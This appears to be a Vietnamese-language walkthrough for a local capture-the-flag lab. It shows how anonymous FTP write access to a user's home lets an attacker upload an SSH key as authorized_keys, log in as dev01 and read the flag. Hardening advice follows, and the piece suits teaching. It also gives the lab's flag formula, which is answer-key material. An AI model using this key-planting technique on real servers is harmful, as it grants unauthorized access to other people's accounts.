# 🎯 FTP-to-SSH Exploit Lab - Hướng Dẫn Giải

## ⚠️ CẢNH BÁO: SPOILER ALERT!

Tài liệu này chứa hướng dẫn chi tiết cách giải lab. Hãy thử tự mình giải trước khi đọc!

---

## 📊 Tổng Quan Kịch Bản

Lab này mô phỏng một hệ thống với nhiều dịch vụ:
- **Web Portal**: Có credentials nhưng không dẫn đến đâu (dead end)
- **FTP Server**: Cho phép anonymous login và upload files
- **SSH Server**: Chỉ chấp nhận key-based authentication

**Lỗ hổng chính:** FTP anonymous root được map trực tiếp vào `/home/dev01`. Flag file có thể nhìn thấy nhưng không thể đọc do permissions. Người dùng phải khám phá thư mục `.ssh` (hoặc tạo mới), upload SSH public key, và SSH vào để đọc flag.

---

## 🔍 Bước 1: Reconnaissance (Khám Phá)

### 1.1. Kiểm Tra Các Dịch Vụ Đang Chạy

```bash
# Kiểm tra container đang chạy
docker-compose ps

# Xem logs
docker-compose logs
```

**Kết quả mong đợi:**
```
Web interface: http://localhost:8080
FTP: localhost:21 (anonymous login)
SSH: localhost:2222
```

### 1.2. Thử Web Interface

Truy cập http://localhost:8080

**Quan sát:**
- Trang login đẹp mắt
- Không có thông tin về credentials
- Thử brute force sẽ mất rất nhiều thời gian

**Kết luận:** Web portal là dead end, cần tìm cách khác.

### 1.3. Thử FTP Server

```bash
ftp localhost 21
```

**Đăng nhập:**
```
Name: anonymous
Password: (nhấn Enter, không cần password)
```

**Kết quả:** ✅ Đăng nhập thành công!

---

## 🎯 Bước 2: Enumeration (Liệt Kê)

### 2.1. Khám Phá Cấu Trúc FTP

Sau khi đăng nhập FTP:

```ftp
ftp> ls
ftp> pwd
```

**Phát hiện quan trọng:**
- `pwd` hiển thị `/` - đây là chroot jail của FTP (không phải root thực tế của hệ thống)
- FTP anonymous root được map vào `/home/dev01` (theo cấu hình `anon_root=/home/dev01`)
- Có thể thấy file `flag.txt` trong listing!
- Có thể thấy thư mục `.ssh` (hoặc cần tạo mới)
- Có thể thấy file `.ftp_hint` (nếu có) để xác nhận đây là home directory

**Kết quả ls:**
```
226 Directory send OK.
-rw-r--r--    1 1000     1000           10 Jan  1 00:00 README.txt
-rw-r-----    1 1000     1000           50 Jan  1 00:00 flag.txt
drwxrwxrwx    2 1000     1000         4096 Jan  1 00:00 .ssh
```

**Làm sao biết đây là `/home/dev01`?**
- Sự hiện diện của `flag.txt` và `.ssh` directory là đặc trưng của home directory
- Thử `get flag.txt` sẽ bị Permission Denied (chứng tỏ đây là home directory với permissions 640)
- `pwd` hiển thị `/` vì đây là chroot jail của FTP, nhưng thực tế đây là `/home/dev01` trên hệ thống

### 2.2. Đọc File README để Tìm Tên User

```ftp
ftp> get README.txt
```

**Kết quả:** ✅ File có thể đọc được!
```
226 Transfer complete.
```

**Nội dung file:**
```
User: dev01
```

**Kết luận:** Tên user là `dev01`!

### 2.3. Thử Đọc Flag File

```ftp
ftp> get flag.txt
```

**Kết quả:** ❌ **Permission Denied!**
```
550 Permission denied.
```

**Phân tích:**
- Flag file có permissions `640` (readable by owner/group only)
- FTP user (anonymous) không có quyền đọc file
- Cần tìm cách khác để đọc flag

### 2.4. Khám Phá Thư Mục .ssh

```ftp
ftp> cd .ssh
ftp> ls
```

**Phát hiện:**
- Thư mục `.ssh` tồn tại và có thể truy cập
- Thư mục này có permissions `777` (writable by everyone)
- Có thể upload files vào đây!

---

## 💡 Bước 3: Exploitation Planning

### 3.1. Phân Tích

**Những gì chúng ta biết:**
1. ✅ FTP anonymous root là `/home/dev01`
2. ✅ Flag file có thể nhìn thấy nhưng không thể đọc (Permission Denied)
3. ✅ Thư mục `.ssh` có thể truy cập và writable (777)
4. ✅ SSH server đang chạy và yêu cầu key-based authentication
5. ✅ User `dev01` tồn tại

**Giả thuyết:**
- Nếu upload `authorized_keys` vào `/home/dev01/.ssh/`
- SSH StrictModes đã bị tắt (cho phép exploit này)
- Chúng ta có thể SSH vào với private key tương ứng
- Sau đó đọc flag file với quyền của user `dev01`

### 3.2. Xác Minh Giả Thuyết

Từ file README.txt, chúng ta đã biết tên user là `dev01`. Thử SSH:

```bash
ssh dev01@ftp-ssh-server
```

**Kết quả:**
```
Permission denied (publickey).
```

✅ User `dev01` tồn tại nhưng cần public key!

---

## 🚀 Bước 4: Exploitation (Khai Thác)

### 4.1. Tạo SSH Key Pair

```bash
# Tạo SSH key pair
ssh-keygen -t rsa -f exploit_key -N ""
```

**Output:**
- `exploit_key` - Private key (giữ bí mật)
- `exploit_key.pub` - Public key (sẽ upload)

### 4.2. Upload Public Key qua FTP

```bash
# Kết nối FTP
ftp ftp-ssh-server

# Đăng nhập
Name: anonymous
Password: (Enter)

# Kiểm tra vị trí hiện tại (sẽ là /home/dev01)
ftp> pwd

# Liệt kê files (sẽ thấy flag.txt và .ssh)
ftp> ls

# Chuyển đến thư mục .ssh
ftp> cd .ssh

# Upload public key với tên authorized_keys
ftp> put exploit_key.pub authorized_keys

# Xác nhận
ftp> ls

# Thoát
ftp> bye
```

**Kết quả mong đợi:**
```
226 Transfer complete.
-rw-r--r--    1 1000     1000          400 Jan  1 00:00 authorized_keys
```

**Lưu ý:** Nếu thư mục `.ssh` chưa tồn tại, bạn có thể tạo nó:
```ftp
ftp> mkdir .ssh
ftp> cd .ssh
```

### 4.3. SSH Vào Server

```bash
# SSH với private key
ssh -i exploit_key dev01@ftp-ssh-server
```

**Kết quả:** ✅ Đăng nhập thành công!

```
Welcome to Ubuntu 22.04 LTS
dev01@ftp-ssh-server:~$
```

---

## 🏁 Bước 5: Post-Exploitation (Sau Khai Thác)

### 5.1. Khám Phá Hệ Thống

```bash
# Kiểm tra user hiện tại
whoami
# Output: dev01

# Kiểm tra thư mục home
ls -la ~

# Tìm flag
ls -la /home/dev01/
```

### 5.2. Chiếm Lấy Flag

```bash
cat /home/dev01/flag.txt
```

**🎉 FLAG:**
```
FLAG{<sha1_hash>}
```

**Lưu ý:** Flag được tạo động dựa trên ngày GMT+7 và biến môi trường EMAIL với format:
- `FLAG{sha1(ddmmyyyy_email_1nj3ct10npwn3d)}`
- ddmmyyyy là ngày GMT+7 (ví dụ: 30112025 cho ngày 30/11/2025)
- email được lấy từ biến môi trường EMAIL (mặc định là "email" nếu không set)
- Flag sẽ thay đổi mỗi ngày theo GMT+7

---

## 📝 Tóm Tắt Các Bước

```bash
# 1. Tạo SSH key pair
ssh-keygen -t rsa -f exploit_key -N ""

# 2. Upload public key qua FTP
ftp ftp-ssh-server
# Login: anonymous / (no password)
# Commands:
#   ls                    # Xem flag.txt và .ssh
#   get flag.txt          # Thử đọc (sẽ bị Permission Denied)
#   cd .ssh               # Vào thư mục .ssh
#   put exploit_key.pub authorized_keys
#   bye

# 3. SSH vào server
ssh -i exploit_key dev01@ftp-ssh-server

# 4. Lấy flag
cat /home/dev01/flag.txt
```

---

## 🔐 Phân Tích Lỗ Hổng

### Lỗ Hổng Chính

**1. Anonymous FTP với Write Permission**
- **Vấn đề:** FTP cho phép anonymous login và upload files
- **Rủi ro:** Kẻ tấn công có thể upload malicious files
- **Cấu hình sai:** `anon_upload_enable=YES` trong vsftpd.conf

**2. FTP Root Directory Misconfiguration**
- **Vấn đề:** FTP anonymous root được map trực tiếp vào `/home/dev01`
- **Rủi ro:** Cho phép truy cập vào home directory của user, thấy flag file, và upload vào `.ssh`
- **Cấu hình sai:** `anon_root=/home/dev01` trong vsftpd.conf

**3. Insufficient Access Control**
- **Vấn đề:** Không có kiểm soát ai có thể upload vào `.ssh`
- **Rủi ro:** Bất kỳ ai cũng có thể thêm SSH key

### Cách Phòng Chống

**Đối với FTP:**
```bash
# Disable anonymous login
anonymous_enable=NO

# Hoặc disable write permission
anon_upload_enable=NO
anon_mkdir_write_enable=NO
```

**Đối với SSH:**
```bash
# Set đúng permissions cho .ssh
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Chỉ owner mới có quyền write
chown user:user ~/.ssh/authorized_keys

# Enable StrictModes (quan trọng!)
# StrictModes yes trong /etc/ssh/sshd_config
```

**Best Practices:**
1. ❌ Không bao giờ enable anonymous FTP với write permission
2. ❌ Không bao giờ map FTP root vào home directory của user
3. ❌ Không bao giờ disable SSH StrictModes trong production
4. ✅ Sử dụng proper file permissions (700 cho .ssh, 600 cho authorized_keys, 640 cho sensitive files)
5. ✅ Implement proper access controls và separation of concerns
6. ✅ Regular security audits
7. ✅ Principle of least privilege

---

## 🎓 Bài Học Rút Ra

1. **Service Enumeration is Key**: Luôn kiểm tra tất cả các dịch vụ đang chạy
2. **Anonymous Access = Red Flag**: Anonymous access với write permission là lỗ hổng nghiêm trọng
3. **Lateral Movement**: Kết hợp nhiều lỗ hổng nhỏ có thể dẫn đến compromise hoàn toàn
4. **Configuration Matters**: Cấu hình sai một dịch vụ có thể ảnh hưởng đến toàn bộ hệ thống
5. **Defense in Depth**: Một lớp bảo mật không đủ, cần nhiều lớp

---

## 🔧 Công Cụ Sử Dụng

| Công Cụ | Mục Đích |
|---------|----------|
| `ftp` | FTP client để kết nối và upload files |
| `ssh-keygen` | Tạo SSH key pair |
| `ssh` | SSH client để kết nối vào server |
| `docker-compose` | Quản lý lab environment |

---

## 📚 Tài Liệu Tham Khảo

- [vsftpd Documentation](https://security.appspot.com/vsftpd.html)
- [SSH Key-Based Authentication](https://www.ssh.com/academy/ssh/public-key-authentication)
- [OWASP - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

---

**Chúc mừng bạn đã hoàn thành lab! 🎉**
